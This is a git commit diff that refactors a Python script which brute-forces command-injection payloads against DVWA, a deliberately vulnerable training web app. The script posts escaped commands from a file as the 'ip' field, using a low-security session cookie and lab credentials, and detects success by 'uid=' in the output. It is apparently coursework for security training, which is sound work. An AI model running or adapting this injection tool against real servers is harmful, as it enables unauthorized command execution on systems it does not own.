e8dd9f22b59e4058c29ad867a075acae69937114
JKA <keirre.adams@gmail.com>
2020-11-15 13:19:31 -0500

    updated to use functions

--- DVWA Command Injection/DVWA_command_injection.py
+++ DVWA Command Injection/DVWA_command_injection.py
@@ -1,27 +1,46 @@
 from bs4 import BeautifulSoup
 import requests
-import time
 import re
 
-with open("escaped_commands.txt") as cfile:
-    commands = cfile.readlines()
+url = 'http://srvr/DVWA/vulnerabilities/exec/#'
 
 cookies_jar = requests.cookies.RequestsCookieJar()
-cookies_jar.set('PHPSESSID','an11cd3fo8soeb1mar55pprnj7')
+cookies_jar.set('PHPSESSID','')
 cookies_jar.set('security','low')
 
-for command in commands:
-    command = command.replace('\r','').replace('\n','')
-    url = 'http://x/DVWA/vulnerabilities/exec/#'
-    params = {'ip': command,'Submit': 'Submit'}
-    r = requests.post(url ,params ,auth=('itp270','itp270'), cookies=cookies_jar, )
-    parseHTML = BeautifulSoup(r.text, 'html.parser')
-    htmlDiv = parseHTML.find('div',{'class': 'vulnerable_code_area'})
 
-    print("trying %s:\n %s \n" % (url, command))
-    if re.findall(r'.*uid\=.*', str(htmlDiv)):
-        print("SUCCESS - command output found")
+def command_inject():
+    commands = get_commands()
+    for command in commands:
+        result = try_command(command)
         print("-+"*40)
-        commands = None
-        break
+        print("<i>trying %s: %s " % (url, command))
+        if check_result(result):
+            print("<+>SUCCESS - command output found")
+        else:
+            print("<o>FAIL")
 
+
+def get_commands():
+    with open("escaped_commands.txt") as cfile:
+        commands = cfile.readlines()
+    return commands
+
+
+def try_command(command):
+    command = command.replace('\r', '').replace('\n', '')
+    params = {'ip': command, 'Submit': 'Submit'}
+    r = requests.post(url, params, auth=('itp270', 'itp270'), cookies=cookies_jar, )
+    parseHTML = BeautifulSoup(r.text, 'html.parser')
+    result = parseHTML.find('div', {'class': 'vulnerable_code_area'})
+    return result
+
+
+def check_result(result):
+    if re.findall(r'.*uid\=.*', str(result)):
+        return True
+    return False
+
+
+if __name__ == "__main__":
+    command_inject()
